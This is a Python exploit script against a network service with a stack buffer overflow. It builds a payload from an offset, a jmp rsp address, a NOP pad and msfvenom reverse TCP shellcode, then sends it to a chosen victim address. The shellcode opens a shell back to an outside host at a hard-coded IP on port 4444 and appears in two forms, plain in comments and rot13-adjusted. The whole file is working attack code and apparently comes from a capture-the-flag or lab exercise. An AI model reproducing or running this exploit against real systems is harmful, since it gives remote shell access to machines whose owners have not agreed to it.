import argparse
import codecs
import socket
import struct

offset = 'A'*24

# CAUTION: any ASCII range value will be rot13
#jmp_rsp = 0x537b0b  # jmp rsp - 0x467b0b (0x46 + 0xD)
jmp_rsp = 0x866d15

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=98.116.179.105 LPORT=4444 -f python
#buf =  b""
#buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
#buf += b"\x97\x48\xb9\x02\x00\x11\x5c\x62\x74\xb3\x69\x51\x48"
#buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
#buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
#buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
#buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

buf =  b""
buf += b"\x77\x29\x4b\x99\x77\x02\x5f\x77"
buf += b"\x01\x5e\x0f\x05\x55\x97\x55\xb9"
buf += b"\x02\x00\x11\x5c\x6f\x67\xb3\x76"
buf += b"\x44\x55\x89\xe6\x77\x10\x4d\x77"
buf += b"\x2a\x4b\x0f\x05\x77\x03\x5e\x55"
buf += b"\xff\xce\x77\x21\x4b\x0f\x05\x68"
buf += b"\xf6\x77\x3b\x4b\x99\x55\xbb\x2f"
buf += b"\x6f\x76\x61\x2f\x66\x75\x00\x46"
buf += b"\x55\x89\xe7\x45\x4a\x55\x89\xe6"
buf += b"\x0f\x05"

junk = b"\x90"*500

def rot13(s: str) -> bytes:
    return codecs.encode(s, 'rot_13').encode()

def pack(a: int) -> bytes:
    return struct.pack('<Q', a)

def exploit(ip: str, port: int, payload: bytes):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))
        print(s.recv(1024).decode())
        s.sendall(payload)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Hack the planet!')
    parser.add_argument('-d', metavar='DESTINATION', default='127.0.0.1',
        help='victim IP address')
    parser.add_argument('-p',metavar='PORT', type=int, default=2888,
        help='service port number')
    args = parser.parse_args()

    payload = rot13(offset) + pack(jmp_rsp) + buf + junk

    exploit(args.d, args.p, payload)
